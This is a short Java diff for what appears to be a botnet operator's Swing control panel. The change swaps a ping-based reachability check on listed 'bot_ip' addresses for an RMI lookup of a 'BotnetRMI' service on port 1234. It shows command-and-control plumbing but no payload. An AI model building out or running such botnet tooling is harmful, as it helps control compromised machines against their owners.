@@ -14,6 +14,7 @@ import java.util.ArrayList;
 import java.lang.String;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.rmi.Naming;
 import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -21,6 +22,7 @@ import javax.swing.ImageIcon;
 import javax.swing.JLabel;
 import javax.swing.border.Border;
 import javax.swing.border.LineBorder;
+import model.IBotnet;
 import server.TCPServer;
 
 /**
@@ -112,18 +114,12 @@ public class ServerUI extends javax.swing.JFrame {
         client.Connect();
         ArrayList<String> list = client.Read("bot_ip");
         ArrayList<String> states = new ArrayList<>();
-        for (String ip : list) {
+        for (String ip : list){
             try {
-                InetAddress inet = InetAddress.getByName(ip.substring(1));
-                if (inet.isReachable(1000)) {
-                    states.add("Available");
-                } else {
-                    states.add("Unavailable");
-                }
-            } catch (UnknownHostException ex) {
-                Logger.getLogger(ServerUI.class.getName()).log(Level.SEVERE, null, ex);
-            } catch (IOException ex) {
-                Logger.getLogger(ServerUI.class.getName()).log(Level.SEVERE, null, ex);
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
+                states.add("Available");
+            } catch (Exception ex){
+                states.add("Unavailable");
             }
         }
         new ListFrm(list, states).setVisible(true);
